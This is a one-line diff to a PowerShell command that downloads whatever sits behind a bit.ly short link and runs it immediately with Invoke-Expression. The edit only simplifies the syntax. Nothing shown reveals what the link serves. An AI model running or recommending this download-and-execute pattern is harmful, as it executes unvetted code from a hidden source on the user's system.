@@ -1,1 +1,1 @@
-iex ((iwr "https://bit.ly/3pqGSO1").Content)
+iex (iwr "bit.ly/3pqGSO1").Content
